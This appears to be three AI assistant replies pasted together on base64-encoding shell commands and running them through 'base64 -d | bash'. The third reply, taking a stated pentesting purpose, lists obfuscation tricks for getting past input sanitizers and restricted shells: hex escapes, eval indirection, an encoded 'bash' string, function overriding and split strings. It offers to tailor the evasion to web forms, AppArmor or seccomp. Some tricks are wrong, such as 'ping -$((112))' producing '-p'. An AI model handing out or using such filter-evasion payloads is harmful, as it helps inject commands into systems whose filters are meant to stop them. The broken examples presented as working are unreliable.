You're very close! The problem is with your use of the `|` and `>` operators together. Here's the correct syntax:

```bash
echo "ping -c 1 192.168.1.3" | base64 > encode.txt
```

### Explanation:

* `echo "ping -c 1 192.168.1.3"` ‚Äì outputs the string.
* `| base64` ‚Äì pipes the string to `base64` to encode it.
* `> encode.txt` ‚Äì redirects the final output to the file.

### To verify:

You can run:

```bash
cat encode.txt
```

And you should see the Base64-encoded version of the string.

If you want to decode it back, you can do:

```bash
base64 -d encode.txt
```

Let me know if you want to write the encoded version **as part of a script** or use it in another context.


------

To run a **base64-encoded command** stored in a variable like `$ENC`, you'll first need to **decode** it before passing it to `bash`.

Here's the correct way to do that:

### Step-by-step:

1. Store the base64-encoded string in a variable:

   ```bash
   ENC=$(echo "ping -c 1 192.168.1.3" | base64)
   ```

2. Run it by **decoding and piping to `bash`**:

   ```bash
   echo "$ENC" | base64 -d | bash
   ```

### What this does:

* `echo "$ENC"`: Outputs the base64 string.
* `base64 -d`: Decodes it back to the original command.
* `bash`: Executes the decoded command.

### One-liner version:

If `$ENC` is already defined:

```bash
echo "$ENC" | base64 -d | bash
```

Let me know if you're doing this inside a script or need to pass arguments dynamically.



-----------

Got it ‚Äî you're doing pentesting, and you're dealing with a system that filters or blocks certain flags like `-p`. Obfuscating the command to bypass such restrictions is a common challenge in restricted shell environments or application input filters.

Below are several techniques to **obfuscate or bypass flag filtering**, especially for things like `-p`, depending on the restrictions.

---

### ‚ö†Ô∏è **Assumptions and Goal**

You're trying to run something like:

```bash
ping -p [some value] ...
```

But `-p` is blocked ‚Äî either by a wrapper script, input sanitizer, or shell restrictions.

---

## üîê Techniques for Obfuscating or Bypassing `-p` Flag

### 1. **Use `--` to stop flag parsing (not always applicable)**

Some commands stop parsing flags after `--`:

```bash
ping -- -p
```

This won't work in `ping`, but works in some other tools ‚Äî worth testing in other contexts.

---

### 2. **Use `$'\x2d'` to represent `-`**

The `-` character is ASCII 45, or `0x2d`. So you can do:

```bash
ping $'\x2d'p somevalue 192.168.1.1
```

‚úÖ This often bypasses flag filters that are looking for the string `-p`.

---

### 3. **Command substitution / wrapping**

Use a wrapper script or indirect eval:

```bash
CMD="ping"; FLAG="-p"; $CMD $FLAG somevalue 192.168.1.1
```

Or more obfuscated:

```bash
eval "$CMD $FLAG somevalue 192.168.1.1"
```

This can get past filters scanning static command strings.

---

### 4. **Use Base64 encoding + decoding at runtime**

Encode the full command:

```bash
ENC=$(echo "ping -p somevalue 192.168.1.1" | base64)
echo $ENC | base64 -d | bash
```

You can also obfuscate base64 decoding itself:

```bash
echo $ENC | $(echo YmFzaA== | base64 -d)
```

(`YmFzaA==` is base64 for `bash`)

---

### 5. **Hex-encoding individual characters**

Similar to `$'\x2d'`, but more granular:

```bash
$(echo "ping $'\x2d'p foo 192.168.1.1" | bash)
```

You can construct the command character by character if needed:

```bash
CMD=$(printf "\x70\x69\x6e\x67")  # "ping"
FLAG=$(printf "\x2d\x70")         # "-p"
$CMD $FLAG somevalue 192.168.1.1
```

---

### 6. **Use `printf` instead of `echo` for better control**

Sometimes `echo` doesn't interpret escape sequences well. `printf` is better:

```bash
printf "ping \x2d\x70 somevalue 192.168.1.1\n" | bash
```

---

### 7. **Function Overriding / Shell Function Tricks**

You can define your own `ping` function that internally uses `-p`, bypassing the wrapper:

```bash
function ping() {
  /bin/ping -p "$@"
}
ping somevalue 192.168.1.1
```

Useful if the system has overridden `ping` with a restricted version.

---

### 8. **Split the flag into parts**

Some filters look for whole strings like `-p`, so split it:

```bash
ping -$((112))  # 112 is ASCII for 'p'
```

Or:

```bash
ping "-""p"
```

---

## üß™ Test Which Filters Are in Place

If you're unsure what part is being filtered (the `-`? the whole `-p`? just `p`?), test incrementally:

```bash
ping -p
ping $'\x2d'p
ping -$((112))
ping "-""p"
```

---

## üõ†Ô∏è Final Obfuscated Example (one-liner)

```bash
ENC=$(echo "ping $'\x2d'p deadbeef 192.168.1.1" | base64)
echo "$ENC" | base64 -d | bash
```

Or even:

```bash
echo cGluZyAkJ1x4MmQncCBkZWFkYmVlZiAxOTIuMTY4LjEuMQ== | base64 -d | bash
```

---

Let me know if:

* The target system is Linux or something else.
* The command is being passed via a web form, CLI, or some other input method.
* You suspect shell wrapping or input sanitization tools like `AppArmor`, `seccomp`, or custom scripts.

We can tailor the evasion further depending on that.
